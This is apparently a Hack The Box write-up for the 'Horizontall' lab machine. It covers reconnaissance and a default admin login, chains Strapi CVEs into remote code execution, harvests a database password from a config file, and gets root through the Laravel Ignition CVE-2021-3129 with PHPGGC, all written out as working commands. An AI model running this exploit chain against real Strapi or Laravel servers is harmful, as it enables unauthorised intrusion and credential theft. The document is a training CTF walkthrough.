> Author: **[wail99][author-profile]**

## Discovery

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

The webpage is dynamically generated, it's a huge heap of JS. So I switched to searching
for endpoints, in particular APIs:

```javascript
r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
```

```bash
curl -i -s -k -X GET http://api-prod.horizontall.htb/reviews
# HTTP/1.1 200 OK
# Server: nginx/1.14.0 (Ubuntu)
# Date: Fri, 03 Sep 2021 15:42:49 GMT
# X-Powered-By: Strapi <strapi.io> <========== HERE
# [{"id":1,"name":"wail","description":"This is good service","stars":4,"created_at":"2021-05-29T13:23:38.000Z","updated_at":"2021-05-29T13:23:38.000Z"},{"id":2,"name":"doe","description":"i'm satisfied with the product","stars":5,"created_at":"2021-05-29T13:24:17.000Z","updated_at":"2021-05-29T13:24:17.000Z"},{"id":3,"name":"john","description":"create service with minimum price i hop i can buy more in the futur","stars":5,"created_at":"2021-05-29T13:25:26.000Z","updated_at":"2021-05-29T13:25:26.000Z"}]
```

The first website was completely frozen, we leave it for the Strapi API with
all the promising CVEs.

`admin/src/containers/InputModalStepperProvider/index.js` has a `/proxy?url=`
functionality which could be abused to route to internal IPs and access private
IPs available to the server.

A basic directory enumeration gives us:

```
/admin                (Status: 200) [Size: 854]
/Admin                (Status: 200) [Size: 854]
/users                (Status: 403) [Size: 60]
/reviews              (Status: 200) [Size: 507]
/ADMIN                (Status: 200) [Size: 854]
/Users                (Status: 403) [Size: 60]
/Reviews              (Status: 200) [Size: 507]
```

`http://api-prod.horizontall.htb/users` is forbidden, but the admin page is
accessible. Here I caught another break:

> admin:admin

```json
{
    "jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNjcxMTE0LCJleHAiOjE2MzMyNjMxMTR9.VjOpD6TxXsOXyZ_HQGaEi6P_lZuwh7T_fIsm4bc4XX8",
    "user":{
        "username":"admin",
        "id":3,
        "email":"admin@horizontall.htb",
        "blocked":null,
        "isAdmin":true
    }
}
```

## Footfhold

This is certainly the handyword of another player since there's a [CVE on Strapi][strapi-cve-2019-18818]
to reset the password of anyone, without authentication.

Then [another CVE][article-strapi-cve-2019-19609] grants RCE by exploiting an insecure system call when
installing plugins.

So chaining the two actually gives RCE from scratch! Also there's a [great script][exploit-strapi-cves]
ready-made on Exploit DB.

With these, we land on the box as user strapi:

```bash
python exploits/cve-2019-18818.py http://api-prod.horizontall.htb
```

## Escalation

First of all, upload a ssh key for shellter.

### Get developer?

Just follow the trail:

```bash
grep -ria password . | tee pw.tmp
# ./config/environments/development/database.json:        "password": "#J!:F9Zt2u"
cat config/environments/development/database.json
# {
#   "defaultConnection": "default",
#   "connections": {
#     "default": {
#       "connector": "strapi-hook-bookshelf",
#       "settings": {
#         "client": "mysql",
#         "database": "strapi",
#         "host": "127.0.0.1",
#         "port": 3306,
#         "username": "developer",
#         "password": "#J!:F9Zt2u"
#       },
#       "options": {}
#     }
#   }
# }
mysql -h'127.0.0.1' -D'strapi' -u'developer' -p'#J!:F9Zt2u' -e'show tables;'
mysql -h'127.0.0.1' -D'strapi' -u'developer' -p'#J!:F9Zt2u' -e'select * from strapi_administrator;'
# +----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
# | id | username | email                 | password                                                     | resetPasswordToken | blocked |
# +----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
# |  3 | admin    | admin@horizontall.htb | $2a$10$svfqkU62mjQ5UwYlf2uFKO0ueTYJ61WJ5qS/.EbdLWsXVAXoMPcX6 | NULL               |    NULL |
# +----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
```

However cracking it requires some unquantified effort:

```bash
echo '$2a$10$svfqkU62mjQ5UwYlf2uFKO0ueTYJ61WJ5qS/.EbdLWsXVAXoMPcX6' > admin.hash
hashcat -a 0 -m 3200 -w 6 -S admin.hash /usr/share/wordlists/passwords/rockyou-75.txt
```

The later fails and the bruteforce on the full list takes too long. There must
be something else.

### Laravel ignition CVE

Let's inspect the network sockets:

```bash
ss -tap
# LISTEN    0    128    127.0.0.1:8000    0.0.0.0:*
```

The port 8000 looks like another webserver:

```bash
curl -i http://127.0.0.1:8000 | tee internal.html
#                     <div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
#                             Laravel v8 (PHP v7.4.18)
#                     </div>
```

![][strapi-version]

This version of Laravel is in debug mode by default which opens a path for
exploitation. As [cfreal][cfreal-blog] explains in the [corresponding article][article-laravel-cve-2021-3129],
the Ignition module allows to write to the log file and exploit a gadget chain
from there.

The author released a [script][exploit-laravel-cve-2021-3129] that works along his framework
[PHPGGC][phpggc]: ie I didn't need to read anything before getting root!

```bash
# ssh tunnel to access the remote server from the local port 8000
ssh -L 8000:127.0.0.1:8000 -i ../.ssh/id_rsa strapi@10.10.11.105
# gadget chain = payload
php -d'phar.readonly=0' /usr/share/phpggc/phpggc \
    --phar phar -o exploits/laravel-ignition-flag.phar \
    --fast-destruct monolog/rce1 system 'cat /root/root.txt'
# exploit
python exploits/laravel-ignition-rce.py http://localhost:8000 exploits/laravel-ignition-flag.phar
```

[author-profile]: https://app.hackthebox.eu/users/4005
[article-laravel-cve-2021-3129]: https://www.ambionics.io/blog/laravel-debug-rce
[article-strapi-cve-2019-19609]: https://bittherapy.net/post/strapi-framework-remote-code-execution/
[cfreal-blog]: https://cfreal.github.io/
[exploit-laravel-cve-2021-3129]: https://github.com/ambionics/laravel-exploits
[exploit-strapi-cves]: https://www.exploit-db.com/exploits/50239
[phpggc]: https://github.com/ambionics/phpggc
[strapi-cve-2019-18818]: http://cve.mitre.org/cgi-bin/cvename.cgi?name=2019-18818
[strapi-version]: images/strapi-version.png
